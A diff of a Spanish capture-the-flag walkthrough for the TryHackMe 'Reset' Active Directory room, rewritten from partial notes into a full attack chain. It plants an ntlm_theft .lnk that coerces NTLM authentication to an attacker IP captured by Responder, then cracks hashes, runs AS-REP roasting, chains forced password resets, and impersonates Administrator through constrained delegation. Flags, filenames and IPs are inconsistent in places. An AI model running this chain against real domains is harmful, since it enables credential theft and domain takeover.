@@ -1,379 +1,355 @@
-# TryHackMe — Reset (Restablecer)
+# Restablecer
 
-**Sala:** Reset (`tryhackme.com/room/resetui`)
-**Plataforma:** TryHackMe
-**Dificultad:** **Hard** (~50 min, reto de Active Directory)
-**Tema:** Enumeración SMB anónima · `kerbrute` / `--rid-brute` · Password spray · AS-REP Roast · Cadena de ACLs con BloodHound · **Constrained delegation** (S4U2)
-**Objetivo:** Task 1 — *Find all the flags!* → `user.txt` (automate) y `root.txt` (Administrator).
+Máquina de nivel avanzado de TryHackMe centrada en **Active Directory / Windows** (dominio `thm.corp`, controlador `HayStack`). En la primera sesión el equipo respondía en `10.65.138.18`; tras restablecer la máquina apareció con la IP `10.65.170.42`. Nuestro equipo atacante es `10.65.82.141`. La ruta completa termina con la flag de root `THM{RE_SET_AND_DELEGATE}`.
 
-> **Resumen en una línea:** un DC (`HAYSTACK`, `thm.corp`) con **SMB anónimo** deja leer el share `Data/onboarding`, donde una carta de bienvenida filtra la contraseña por defecto `ResetMe123!`; con `--rid-brute` se saca la lista de usuarios y se hace spray; el resto de la sala es subir por la cadena de ACLs (**AS-REP Roast → reseteos de contraseña → constrained delegation**) hasta impersonar al Administrador.
+## 1. Reconocimiento
 
----
-
-## 0. Información de la máquina
-
-**Una sola VM** (las salas de usuario solo admiten una): es el **Domain Controller**.
-
-| Dato | Valor |
-| --- | --- |
-| Hostname | `HAYSTACK` (`HayStack.thm.corp`) |
-| Dominio | `thm.corp` (NetBIOS `THM`) |
-| SO | Windows Server 2019 Build 17763 (`10.0.17763`) |
-| IP (sesión 1) | `10.65.146.13` (nmap) |
-| IP (sesión 2) | `10.64.182.107` (enum SMB/kerbrute) |
-| IP (sesión 3) | `10.64.135.149` (rid-brute / spray) |
-
-> ⚠️ **La IP cambia cada vez que THM reinicia la máquina** (límite de tiempo de la VM). Anota siempre usuarios/credenciales entre sesiones para retomar donde lo dejaste.
-
-Añadir a `/etc/hosts`:
-
-```
-<IP> HayStack.thm.corp thm.corp
-```
-
----
-
-## 1. Reconocimiento (Nmap)
+Escaneo inicial de puertos:
 
 ```bash
-nmap -sV -sC IP_MACHINA
+nmap 10.65.138.18
 ```
 
-![[Pasted image 20261119090111.png]]
+![[Pasted image 20261123120204.png]]
 
-Puertos clave del DC: **53** (DNS), **88** (Kerberos), **135/139** (RPC/NetBIOS), **389/636/3268/3269** (LDAP/LDAPS/GC), **445** (SMB), **464** (kpasswd), **3389** (RDP).
+Puertos abiertos:
 
-![[Pasted image 20261119090133.png]]
+- **53/tcp** → domain (DNS).
+- **88/tcp** → kerberos-sec (Kerberos).
+- **135/tcp** → msrpc.
+- **139/tcp** → netbios-ssn.
+- **389/tcp** → ldap.
+- **445/tcp** → microsoft-ds (SMB).
+- **464/tcp** → kpasswd5.
+- **593/tcp** → http-rpc-epmap.
+- **636/tcp** → ldapssl (LDAP sobre SSL).
+- **3268/tcp** → globalcatLDAP (Global Catalog).
+- **3269/tcp** → globalcatLDAPssl.
+- **3389/tcp** → ms-wbt-server (RDP).
 
-El script de RDP entrega el dominio sin autenticar (`rdp-ntlm-info`):
+El conjunto de puertos (DNS, Kerberos, LDAP, Global Catalog, SMB y RDP) delata que estamos ante un **controlador de dominio de Windows**.
 
-```
-Target_Name: THM
-NetBIOS_Domain_Name: THM
-NetBIOS_Computer_Name: HAYSTACK
-DNS_Domain_Name: thm.corp
-DNS_Computer_Name: HayStack.thm.corp
-Product_Version: 10.0.17763
-```
+## 2. Enumeración de servicios y versión
 
-- `ssl-cert: commonName=HayStack.thm.corp` → SAN para el `/etc/hosts`.
-- `smb2-security-mode: 311 → Message signing enabled and required` (no se puede forzar NTLM relay tan fácil).
-
----
-
-## 2. SMB anónimo y enumeración de usuarios
-
-Comprobar si acepta login sin credenciales (aquí sí: `Null Auth:True`):
+Escaneo con detección de versiones y scripts por defecto:
 
 ```bash
-nxc smb IP_MACHINA
+nmap -sV -sC 10.65.138.18
 ```
 
-![[Pasted image 20261119101341.png]]
+![[Pasted image 20261123121101.png]]
 
-```
-[*] Windows 10 / Server 2019 Build 17763 x64 (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:None) (Null Auth:True)
-```
+![[Pasted image 20261123121127.png]]
 
-### 2.1 `kerbrute` — ¿qué usuarios existen?
+Datos relevantes:
+
+- **53/tcp** → Simple DNS Plus.
+- **88/tcp** → Microsoft Windows Kerberos (server time: 2026-11-23T17:01:25Z).
+- **389/tcp y 3268/tcp** → Microsoft Windows Active Directory LDAP, dominio `thm.corp.`, sitio `Default-First-Site-Name`.
+- **593/tcp** → Microsoft Windows RPC over HTTP 1.0.
+- **3389/tcp** → Microsoft Terminal Services, certificado con `commonName=HayStack.thm.corp` (válido del 2026-11-22 al 2027-05-24).
+- `rdp-ntlm-info` revela:
+  - `Target_Name`: THM
+  - `NetBIOS_Domain_Name`: THM
+  - `NetBIOS_Computer_Name`: HAYSTACK
+  - `DNS_Domain_Name`: thm.corp
+  - `DNS_Computer_Name`: HayStack.thm.corp
+  - `DNS_Tree_Name`: thm.corp
+  - `Product_Version`: 10.0.17763 (Windows Server 2019)
+  - `System_Time`: 2026-11-23T17:01:26+00:00
+- Service Info: Host: HAYSTACK; OS: Windows; CPE: `cpe:/o:microsoft:windows`.
+
+## 3. Enumeración SMB
+
+Añadimos el nombre del dominio a `/etc/hosts` y listamos los recursos compartidos de forma anónima:
 
 ```bash
-kerbrute userenum --dc IP_MACHINA -d thm.corp /home/kali/SecLists/Usernames/xato-net-10-million-usernames.txt
+nano /etc/hosts
+smbclient -L //10.65.138.18 -N
 ```
 
-![[Pasted image 20261119101403.png]]
+![[Pasted image 20261123121439.png]]
 
-```
-[+] VALID USERNAME: guest@thm.corp
-[+] VALID USERNAME: administrator@thm.corp
-[+] VALID USERNAME: haystack@thm.corp
-```
+![[Pasted image 20261123121455.png]]
 
-- La primera pasada con la wordlist grande dio `Tested 1000 usernames (0 valid)` — probar con varias listas de SecLists.
-- `guest` y `administrator` válidos → probar siempre el acceso anónimo.
+Recursos compartidos:
 
-### 2.2 Shares accesibles sin contraseña
+| Share    | Tipo | Comentario           |
+| -------- | ---- | -------------------- |
+| ADMIN$   | Disk | Remote Admin         |
+| C$       | Disk | Default share        |
+| Data     | Disk |                      |
+| IPC$     | IPC  | Remote IPC           |
+| NETLOGON | Disk | Logon server share   |
+| SYSVOL   | Disk | Logon server share   |
+
+El servidor tiene SMB1 desactivado y no muestra grupos de trabajo.
+
+## 4. Archivos de onboarding
+
+Entramos al recurso `Data` sin credenciales y exploramos la carpeta `onboarding`, donde hay documentos PDF y un archivo de texto:
 
 ```bash
-smbclient -L //IP_MACHINA -N
-```
-
-![[Pasted image 20261119102227.png]]
-
-```
-ADMIN$   Remote Admin
-C$       Default share
-Data     <-- el interesante
-IPC$     Remote IPC
-NETLOGON Logon server share
-SYSVOL   Logon server share
-```
-
----
-
-## 3. `Data/onboarding` — la contraseña por defecto
-
-```bash
-smbclient //IP_MACHINA/Data -N
-```
-
-![[Pasted image 20261119102332.png]]
-
-```
+smbclient //10.65.138.18/Data -N
 smb: \> ls
-onboarding
+smb: \> cd onboarding\
+smb: \onboarding\> ls
+smb: \onboarding\> get onhdjn4i.vmd.pdf
 ```
 
-Dentro de `onboarding` hay ficheros con **nombres aleatorios que cambian** (3 PDFs y 1 `.txt` de 521 bytes). El `.txt` es una carta de bienvenida:
+![[Pasted image 20261123121621.png]]
 
-![[Pasted image 20261119104118.png]]
+![[Pasted image 20261123122138.png]]
 
-```
-Subject: Welcome to Reset — Dear <USER>, Welcome aboard!
-...
-The initial password is: ResetMe123!
-Best regards,
-The Reset Team
-```
+Contenido de `onboarding`:
 
-**Contraseña por defecto de la organización → `ResetMe123!`**
+- `rtd1ahgw.ooo.txt` (521 bytes).
+- `wpyo5ehb.rgg.pdf` (3.032.659 bytes).
+- `xek1gwvl.5xc.pdf` (4.700.896 bytes).
 
-- Truco: si los nombres cambian, baja todo de golpe:
-  ```
-  smb: \onboarding\> mask ""
-  smb: \onboarding\> prompt OFF
-  smb: \onboarding\> mget *
-  ```
+> **Evidencia:** el acceso anónimo a `Data\onboarding` es el punto de entrada que permitirá colocar el señuelo del paso 6.
 
----
+## 5. Contraseña inicial
 
-## 4. Primer spray — `haystack`
+El archivo de texto filtrado dice:
 
 ```bash
-nxc smb IP_MACHINA -u 'haystack' -p 'ResetMe123!'
+cat dyasxsu5.h0t.txt
 ```
 
-![[Pasted image 20261119104541.png]]
+> Subject: Welcome to Reset -Dear &lt;USER&gt;,Welcome aboard! We are thrilled to have you join our team. As discussed during the hiring process, we are sending you the necessary login information to access your company account. Please keep this information confidential and do not share it with anyone. **The initial password is: ResetMe123!** We are confident that you will contribute significantly to our continued success. We look forward to working with you and wish you the very best in your new role. Best regards, The Reset Team
 
-```
-[+] thm.corp\haystack:ResetMe123! (Guest)
-```
+![[Pasted image 20261123122059.png]]
 
-> ⚠️ **Ojo con `(Guest)`:** nxc marca `[+]` cuando la sesión baja a **invitado** (el servidor permite null session), no necesariamente porque la contraseña sea correcta. Un resultado solo es fiable si **no** lleva `(Guest)` (o sale `Pwn3d!`). Ver §7.
+## 6. Robo de credenciales NTLM con un archivo .lnk
 
----
-
-## 5. AS-REP Roast — del error al hash
-
-### 5.1 Intento fallido: lista equivocada
+Tras restablecer la máquina (ahora `10.65.170.42`), generamos un acceso directo malicioso con `ntlm_theft` apuntando a nuestra IP de atacante (`10.65.82.141`):
 
 ```bash
-impacket-GetNPUsers thm.corp/ -dc-ip IP_MACHINA -usersfile /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+python3 ntlm_theft.py -g lnk -s 10.65.82.141 -f pwd
 ```
 
-![[Pasted image 20261119161646.png]]
+![[Pasted image 20261123160227.png]]
 
-```
-[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
-... (repetido para cada "usuario")
-```
+![[Pasted image 20261123160232.png]]
 
-**Qué falló:** `-usersfile` espera una **lista de usuarios**, no una wordlist de directorios web. Con nombres como `images/` el KDC responde *client not found*.
-
-### 5.2 Segundo intento, ahora con `clean_users.txt` ✅
-
-Con la lista de usuarios ya montada (§6) se relanza el mismo comando:
+Y lo subimos al recurso compartido `Data\onboarding`, en el mismo sitio donde están los documentos de onboarding:
 
 ```bash
-impacket-GetNPUsers thm.corp/ -dc-ip IP_MACHINA -usersfile clean_users.txt -no-pass
+smbclient //10.65.170.42/Data -N
+smb: \> cd onboarding\
+smb: \onboarding\> put pwd.lnk
 ```
 
-![[Pasted image 20261120214558.png]]
+![[Pasted image 20261123160316.png]]
 
-Salida: los usuarios **con** `UF_DONT_REQUIRE_PREAUTH` devuelven su hash listo para crackear; los que no, se descartan:
+El archivo `pwd.lnk` (2164 bytes) queda junto al resto de documentos, esperando a que alguien lo abra.
 
-![[Pasted image 20261120215535.png]]
+## 7. Captura del hash NTLMv2 con Responder
 
-```
-[-] User SHAWNA_BRAY doesn't have UF_DONT_REQUIRE_PREAUTH set
-$krb5asrep$23$ERNESTO_SILVA@THM.CORP:...
-```
-
-![[Pasted image 20261120215650.png]]
-
-```
-$krb5asrep$23$TABATHA_BRITT@THM.CORP:...:marlboro(1985)   <-- ya crackeado (john --show)
-$krb5asrep$23$LEANN_LONG@THM.CORP:...
-```
+Levantamos Responder en la interfaz de nuestro equipo:
 
 ```bash
-john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
-john --show asrep_hashes.txt
+responder -I ens5
 ```
 
-**Resultado:** 3 hashes (`ERNESTO_SILVA`, `TABATHA_BRITT`, `LEANN_LONG`) → **`TABATHA_BRITT` = `marlboro(1985)`** ✅ *(captura propia, 20/11)*.
+![[Pasted image 20261123160359.png]]
 
-> Los `KDC_ERR_C_PRINCIPAL_UNKNOWN` que siguen apareciendo son los **nombres truncados** por el `awk` de §6 que arrastró `clean_users.txt` — los usuarios roastables reales se distinguen porque devuelven hash.
+![[Pasted image 20261123160426.png]]
 
----
+![[Pasted image 20261123160448.png]]
 
-## 6. `--rid-brute` — la lista de usuarios gratis
+Dejamos que Responder envenene LLMNR/NBT-NS/MDNS y escuche los eventos SMB. Aparece la conexión:
 
-`anonymous` tiene acceso de lectura a `IPC$`, lo que permite enumerar SIDs:
+```text
+[SMB] NTLMv2-SSP Client   : 10.65.170.42
+[SMB] NTLMv2-SSP Username : THM\AUTOMATE
+[SMB] NTLMv2-SSP Hash     : THM\AUTOMATE::THM:b031b6898670ee33:6f4bdd558bb16ac48b3f2b0b27c76d78:0101000…
+```
+
+![[Pasted image 20261123160514.png]]
+
+Las siguientes peticiones se omiten por estar ya capturada la misma cuenta (`Skipping previously captured hash for THM\AUTOMATE`).
+
+## 8. Crackeo del hash con hashcat
+
+Guardamos el hash en `hash.txt` y lo atacamos con el modo **5600 (NetNTLMv2)** y el diccionario rockyou:
 
 ```bash
-nxc smb IP_MACHINA -u 'anonymous' -p '' --rid-brute
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-![[Pasted image 20261119162120.png]]
+![[Pasted image 20261123162551.png]]
 
-![[Pasted image 20261119164300.png]]
+El hash se rompe al instante (1/1 digests, 0 segundos):
 
-```
-498: THM\Enterprise Read-only Domain Controllers (SidTypeGroup)
-500: THM\Administrator (SidTypeUser)
-501: THM\Guest (SidTypeUser)
-502: THM\krbtgt (SidTypeUser)
-512: THM\Domain Admins (SidTypeGroup)
-518: THM\Schema Admins (SidTypeGroup)
-519: THM\Enterprise Admins (SidTypeGroup)
-...
-1108: THM\HAYSTACKS (SidTypeUser)
-1111: THM\3091731410SA (SidTypeUser)
+```text
+AUTOMATE::THM:b031b6898670ee33:…:Passw0rd1
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+Time.Estimated...: Mon Nov 23 21:26:10 2026 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
 ```
 
-La salida sigue con decenas de usuarios reales:
+![[Pasted image 20261123162633.png]]
 
-![[Pasted image 20261119164322.png]]
+**Credenciales obtenidas:** `AUTOMATE:Passw0rd1`
 
-![[Pasted image 20261119164344.png]]
+## 9. Acceso WinRM y bandera de usuario
 
-```
-1112: THM\ERNESTO_SILVA   1113: THM\TRACY_CARVER   1114: THM\SHAWNA_BRAY
-1131: THM\TABATHA_BRITT   1135: THM\LILY_ONEILL    1142: THM\CRUZ_HALL
-1144: THM\DARLA_WINTERS   1149: THM\LEANN_LONG    1156: THM\AUTOMATE
-...
-```
-
-Guardado en fichero:
-
-![[Pasted image 20261119164410.png]]
+Con las credenciales entramos por WinRM y leemos la flag del usuario desde el escritorio:
 
 ```bash
-nxc smb IP_MACHINA -u 'anonymous' -p '' --rid-brute > rid_brutr.txt
-cat rid_brutr.txt | awk '{print $6}' > rid_users.txt
-cat rid_users.txt
+cat credenciales.txt
+evil-winrm -u AUTOMATE -p Passw0rd1 -i 10.65.170.42
 ```
 
-> ⚠️ **Fallo de parsing:** `awk '{print $6}'` **corta los nombres con espacios** — `THM\Domain Admins` se queda en `THM\Domain`, `THM\Schema Admins` en `THM\Schema`… Por eso el spray de §7 llena de nombres raros (`Domain`, `Schema`, `Group`, `Read-only`…). Forma correcta (solo usuarios, sin cortar):
-> ```bash
-> grep SidTypeUser rid_brutr.txt | cut -d '\' -f 2 | cut -d ' ' -f 1 > rid_users.txt
-> ```
+![[Pasted image 20261123163117.png]]
 
----
+```powershell
+PS C:\Users\automate\Desktop> type "C:\Users\automate\Desktop\user.txt"
+THM{AUTOMATION_WILL_REPLACE_US}
+```
 
-## 7. Password spray con `ResetMe123!`
+![[Pasted image 20261123163337.png]]
+
+**Bandera de usuario:** `THM{AUTOMATION_WILL_REPLACE_US}`
+
+## 10. Enumeración de usuarios del dominio
+
+Con la cuenta de bajo privilegio consultamos los SIDs del dominio para obtener el listado de usuarios y grupos:
 
 ```bash
-nxc smb IP_MACHINA -u clean_users.txt -p 'ResetMe123!' --continue-on-success
+impacket-lookupsid 'thm.corp/AUTOMATE:Passw0rd1'@10.64.134.198
 ```
 
-![[Pasted image 20261119165214.png]]
+![[Pasted image 20261123231557.png]]
 
-```
-[+] thm.corp\Windows: ResetMe123! (Guest)
-[+] thm.corp\anonymous: ResetMe123! (Guest)
-[-] thm.corp\Administrator: ResetMe123! STATUS_ACCOUNT_RESTRICTION
-[-] thm.corp\Guest: ResetMe123! STATUS_LOGON_FAILURE
-[-] thm.corp\krbtgt: ResetMe123! STATUS_LOGON_FAILURE
-[+] thm.corp\Domain: ResetMe123! (Guest)      <-- truncado de "Domain Admins"
-[+] thm.corp\Schema: ResetMe123! (Guest)      <-- truncado de "Schema Admins"
-...
-```
+La salida revela los grupos privilegiados (`Domain Admins`, `Enterprise Admins`, `Protected Users`, `Key Admins`, los grupos de replicación RODC…) y más de un centenar de cuentas de usuario, entre ellas `TABATHA_BRITT`, `SHAWNA_BRAY`, `CRUZ_HALL`, `DARLA_WINTERS`, `MELANIE_MONTGOMERY` y `MALLORY_LEWIS`. Ese listado se guarda en `usuario.txt` para usarlo como diccionario de usuarios.
 
-![[Pasted image 20261119165238.png]]
+## 11. AS-REP Roasting
 
-- **Todos los `[+]` llevan `(Guest)`** → son falsos positivos (nombres truncados del awk + null session), **ninguno** es una cuenta real autenticada.
-- Los usuarios reales devuelven `[-] STATUS_LOGON_FAILURE` / `STATUS_ACCOUNT_RESTRICTION`.
-
-> **Lección:** en un spray con nxc, lee siempre el resultado completo: `[+] ... (Guest)` ≠ cuenta comprometida. Busca `[+]` **sin `(Guest)`** o `Pwn3d!`.
-
-Re-ejecución el 20/11 con el mismo resultado (mismo `clean_users.txt`):
-
-![[Pasted image 20261120214106.png]]
-
----
-
-## 8. Validación de credenciales por SMB y GPP en SYSVOL
-
-Con la contraseña crakeada en §5 se validan las credenciales contra SMB. El **primer intento falla por un typo** en la contraseña (`marlboro(1985))`) → `STATUS_LOGON_FAILURE`; repetido limpio → `[+]` y shares enumerados (`Data` con `READ,WRITE`):
-
-![[Pasted image 20261120220953.png]]
+Pedimos tickets AS-REP para esos usuarios contra el controlador de dominio:
 
 ```bash
-nxc smb IP_MACHINA -u 'TABATHA_BRITT' -p 'marlboro(1985)' --shares
+impacket-GetNPUsers thm.corp/ -dc-ip 10.64.134.198 -userfile usuario.txt -no-pass
 ```
 
-> ⚠️ **Lección:** un `STATUS_LOGON_FAILURE` tras un spray de una sola cuenta casi siempre es **typo**, no contraseña mala. Repite la credencial a mano antes de descartarla.
+![[Pasted image 20261123232621.png]]
 
-A continuación, búsqueda de contraseñas GPP en SYSVOL (el clásico `cpassword` en XML):
+La mayoría responde `doesn't have UF_DONT_REQUIRE_PREAUTH set`, pero varias cuentas sí tienen desactivada la preautenticación Kerberos y devuelven un hash `$krb5asrep$23$…` susceptible de ataque offline. Se guardan tres hashes en `hash0n.txt`: `TABATHA_BRITT`, `STIVA_BENNETT` y `MELANIE_MONTGOMERY`.
+
+## 12. Crackeo de la contraseña de TABATHA_BRITT
+
+Atacamos los hashes AS-REP con John the Ripper y rockyou:
 
 ```bash
-nxc smb IP_MACHINA -u 'TABATHA_BRITT' -p 'marlboro(1985)' -M gpp_password
+john hash0n.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-![[Pasted image 20261120221804.png]]
+![[Pasted image 20261123233435.png]]
 
-- `[+] Found SYSVOL share` → `[+] Searching for potential XML files containing passwords`.
-- **Pendiente:** la captura queda en la búsqueda; sin `cpassword` visible, la vía sigue siendo la cadena de ACLs (§9).
+![[Pasted image 20261123233508.png]]
 
----
+John carga 3 hashes con 3 sales distintas (tipos 17/18/23) y obtiene:
 
-## 9. Pendiente: la cadena hasta las dos flags
+```text
+marlboro(1985)    ($krb5asrep$23$TABATHA_BRITT@THM.CORP)
+```
 
-Las capturas llegan hasta la validación de `TABATHA_BRITT` (§8). Según los writeups públicos, el tramo que falta tiene **dos caminos** hasta las flags:
+**Credenciales obtenidas:** `TABATHA_BRITT:marlboro(1985)`
 
-**Camino A — forzar autenticación (NTLM theft):**
-1. Los nombres de `onboarding` cambian = **hay alguien navegando el share**.
-2. `python3 ntlm_theft.py -g url -s TU_IP -f test` → subir el `.url` a `onboarding` + `sudo responder -I tun0` → hash NTLMv2 de `AUTOMATE`.
-3. `john --wordlist=rockyou.txt hash` → `evil-winrm -i haystack.thm.corp -u automate -p ...` → `C:\Users\automate\Desktop\user.txt`.
+## 13. Exportación y análisis con BloodHound
 
-**Camino B — AS-REP Roast + cadena de ACLs (por aquí vas):**
-1. ✅ **Hecho (§5):** `GetNPUsers` con la lista corregida → hashes de `ERNESTO_SILVA`, `TABATHA_BRITT`, `LEANN_LONG` → `john` → **`TABATHA_BRITT` = `marlboro(1985)`**.
-2. ✅ **Hecho (§8):** credenciales validadas por SMB (`[+]` + shares) y GPP explorado en SYSVOL.
-3. Pendiente — BloodHound: `TABATHA_BRITT` →`GenericAll`→ `SHAWNA_BRAY` →`ForceChangePassword`→ `CRUZ_HALL` →`GenericWrite`→ `DARLA_WINTERS` (resetear contraseñas con `net rpc password`).
-4. `DARLA_WINTERS` tiene **constrained delegation** sobre `cifs/haystack.thm.corp`:
-   ```bash
-   getST.py -spn "cifs/haystack.thm.corp" -impersonate "Administrator" "thm.corp/DARLA_WINTERS:<pass>"
-   export KRB5CCNAME=Administrator.ccache
-   wmiexec.py -k -no-pass Administrator@haystack.thm.corp
-   type C:\Users\Administrator\Desktop\root.txt
-   ```
+Recolectamos los datos del dominio y generamos el archivo para BloodHound:
 
-> ⚠️ **Pendiente de completar con capturas propias.** Ruta descrita de writeups públicos (jaxafed, Rich); verifica los pasos y las flags en tu instancia. Ojo: para Kerberos, **sincroniza la hora** con el DC (`htpdate`/`chrony`).
+```bash
+bloodhound-python -u TABATHA_BRITT -p 'marlboro(1985)' -d THM.CORP -ns 10.64.134.198 -c All --zip
+bloodhound-start
+```
 
----
+![[Pasted image 20261123234101.png]]
 
-## 10. Flags
+El recolector identifica el dominio `thm.corp`, el DC `haystack.thm.corp`, **52 usuarios, 55 grupos, 3 GPOs, 19 contenedores, 222 OUs y 0 trusts**, y comprime la salida en `2026112323804_bloodhound.zip`. `bloodhound-start` inicia Neo4j en `http://localhost:7474`.
 
-| Flag | Valor | Estado |
-| --- | --- | --- |
-| Contraseña inicial (onboarding) | `ResetMe123!` | ✅ captura propia |
-| Creds AS-REP (`TABATHA_BRITT`) | `marlboro(1985)` | ✅ captura propia |
-| User flag (`user.txt`, automate) | `THM{AUTOMATION_WILL_REPLACE_US}` | ⚠️ writeup — verificar |
-| Root flag (`root.txt`, Administrator) | `THM{RE_RE_RE_SET_AND_DELEGATE}` | ⚠️ writeup — verificar |
+En BloodHound Community Edition (`http://127.0.0.1:8080`) trazamos la ruta de `TABATHA_BRITT@THM.CORP` a `DOMAIN ADMINS@THM.CORP`:
 
----
+![[Pasted image 20261124005550.png]]
 
-## 11. Lecciones
+![[Pasted image 20261124005514.png]]
 
-1. **`--rid-brute` con anonymous = lista de usuarios sin coste** — el paso previo obligatorio para cualquier spray o AS-REP.
-2. **`-usersfile` de GetNPUsers quiere usuarios**, no wordlists de directorios: si ves `KDC_ERR_C_PRINCIPAL_UNKNOWN` en masa, revisa la lista.
-3. **`awk '{print $6}'` rompe los nombres con espacios** → falsos usuarios (`Domain`, `Schema`…) y resultados basura. Usa `grep SidTypeUser | cut`.
-4. **`[+] ... (Guest)` con nxc no es una credencial válida** — es la sesión de invitada del null session.
-5. **Un `STATUS_LOGON_FAILURE` de una sola cuenta suele ser typo**, no contraseña mala (§8).
-6. **Un share con ficheros que cambian de nombre = actividad humana** → `ntlm_theft` + `responder` para capturar hashes (ojo, es el camino corto a `automate`).
-7. **La cadena completa del dominio:** contraseña por defecto → spray → AS-REP → reset de contraseñas por ACLs → **constrained delegation** → Administrator. Cada eslabón por sí solo no es grave; juntos, dominio caído.
-8. **THM reinicia la VM y cambia la IP**: lleva un fichero con IPs, usuarios y contraseñas entre sesiones.
+La cadena de permisos es:
 
-> Comandos relacionados: `Comando Rapido/Nmap.md`, `Comando Rapido/SMB y Active Directory.md`, `Comando Rapido/Fuerza bruta y crackeo.md`.
+```text
+TABATHA_BRITT →(GenericAll)→ SHAWNA_BRAY →(WriteAccountRestrictions)→ CRUZ_HALL
+→(ForceChangePassword)→ DARLA_WINTERS →(AllowedToDelegate)→ HAYSTACK.THM.CORP
+→(GenericAll / DCsync)→ THM.CORP (dominio)
+   ├─ Contains → TEST@THM.CORP (OU) → HORACE_BOYLE
+   ├─ Contains → SERVICEACCOUNTS@THM.CORP (OU)
+   ├─ Contains → USERS@THM.CORP (OU) → CECILE_WONG
+   └─ Contains → USERS@GTEST.LOCAL (OU) → ADMINISTRATOR@GTEST.LOCAL
+                     └─ MemberOf → DOMAIN ADMINS@THM.CORP
+```
+
+## 14. Cambio de contraseñas y suplantación de Administrator
+
+Ejecutamos el cambio de contraseñas de la cadena con `net rpc password`, usando en cada paso la credencial recién creada. Después pedimos un ticket con `get(tgt)` e `impacket-getST` para suplantar a `Administrator` mediante S4U2proxy:
+
+```bash
+net rpc password "SHAWNA_BRAY" "newP@ssw0rd2022" -U "THM.CORP"/"TABATHA_BRITT"%'marlboro(1985)' -S "THM.CORP"
+net rpc password "CRUZ_HALL" "newP@ssw0rd2022" -U "THM.CORP"/"SHAWNA_BRAY"%"newP@ssw0rd2022" -S "THM.CORP"
+net rpc password "DARLA_WINTERS" "newP@ssw0rd2022" -U "THM.CORP"/"CRUZ_HALL"%"newP@ssw0rd2022" -S "THM.CORP"
+```
+
+![[Pasted image 20261124005449.png]]
+
+Con la última cuenta de la cadena solicitamos el ticket delegado y abrimos una shell sobre el controlador:
+
+```bash
+impacket-getST -k -impersonate Administrator -spn cifs/HAYSTACK.THM.CORP THM.CORP/DARLA_WINTERS
+export KRB5CCNAME=Administrator@cifs_HAYSTACK.THM.CORP@THM.CORP.ccache
+impacket-wmiexec THM.CORP/Administrator@HAYSTACK.THM.CORP -k -no-pass
+```
+
+![[Pasted image 20261124010401.png]]
+
+La salida confirma `Getting TGT for user`, `Impersonating Administrator`, `Requesting S4U2Self`, `Requesting S4U2Proxy` y `Saving ticket in Administrator@cifs_HAYSTACK.THM.CORP@THM.CORP.ccache`. Tras exportar `KRB5CCNAME`, `wmiexec` lanza una shell semiinteractiva con prompt `C:\>`.
+
+![[Pasted image 20261124010429.png]]
+
+## 15. Bandera de root
+
+Desde la shell como `Administrator` recorremos `C:\Users\Administrator\Desktop`, donde aparece `root.txt`:
+
+```powershell
+C:\Users\Administrator\Desktop>type root.txt
+THM{RE_SET_AND_DELEGATE}
+```
+
+![[Pasted image 20261124010453.png]]
+
+**Bandera de root:** `THM{RE_SET_AND_DELEGATE}`
+
+## Resumen de la cadena de ataque
+
+1. `nmap` identifica un controlador de dominio (`HayStack`, `thm.corp`).
+2. `smbclient -L` encuentra el recurso `Data` accesible sin autenticación.
+3. Los documentos de `onboarding` filtran la contraseña inicial `ResetMe123!`.
+4. `ntlm_theft` genera un `.lnk` que, al abrirse desde el compartido, fuerza autenticación NTLM contra nuestro Responder.
+5. Responder captura el NetNTLMv2 del usuario `THM\AUTOMATE`.
+6. `hashcat -m 5600` con rockyou obtiene `Passw0rd1`.
+7. `evil-winrm` permite leer `user.txt` → `THM{AUTOMATION_WILL_REPLACE_US}`.
+8. `impacket-lookupsid` enumera los usuarios del dominio.
+9. `GetNPUsers` captura hashes AS-REP de cuentas sin preautenticación.
+10. `john` crackea el hash de `TABATHA_BRITT` → `marlboro(1985)`.
+11. `bloodhound-python` exporta el dominio y BloodHound traza la ruta hasta `DOMAIN ADMINS`.
+12. `net rpc password` ejecuta el cambio de contraseñas y `getST` suplanta a `Administrator` por delegación (S4U2self/S4U2proxy).
+13. `wmiexec` abre una shell como Administrador y lee `root.txt` → `THM{RE_SET_AND_DELEGATE}`.
+
+## Indicadores (IoC)
+
+- **IPs:** `10.65.138.18`, `10.65.170.42`, `10.64.134.198`, `10.64.132.112`, `10.65.82.141`.
+- **Usuarios:** `AUTOMATE`, `TABATHA_BRITT`, `SHAWNA_BRAY`, `CRUZ_HALL`, `DARLA_WINTERS`, `STIVA_BENNETT`, `MELANIE_MONTGOMERY`.
+- **Hashes:** NTLMv2 de `THM\AUTOMATE` (`b031b6898670ee33…`) → `Passw0rd1`; `$krb5asrep$23$TABATHA_BRITT@THM.CORP` → `marlboro(1985)`; NTLM de `Administrator` `2b576acbe6bcfa729d4b6d180418f8`.
+- **Archivos:** `pwd.lnk`, `usuario.txt`, `hash0n.txt`, `hash.txt`, `credenciales.txt`, `2026112323804_bloodhound.zip`, `user.txt`, `root.txt`.
+- **Flags:** usuario `THM{AUTOMATION_WILL_REPLACE_US}` · root `THM{RE_SET_AND_DELEGATE}`.
